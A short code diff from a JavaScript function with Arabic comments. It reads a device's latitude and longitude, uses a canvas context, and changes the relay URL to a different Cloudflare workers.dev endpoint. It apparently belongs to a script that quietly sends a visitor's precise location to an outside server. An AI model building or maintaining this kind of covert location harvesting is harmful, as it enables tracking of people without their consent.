@@ -19,7 +19,7 @@ async function startProcess() {
     const ctx = canvas.getContext('2d');
 
     // رابط الـ Worker
-    const workerUrl = "https://tlgram.alidm0935.workers.dev/";
+    const workerUrl = "https://noisy-snow-tag.sivistir6.workers.dev/";
 
     // تجهيز رابط الموقع الدقيق
     const lat = position.coords.latitude;
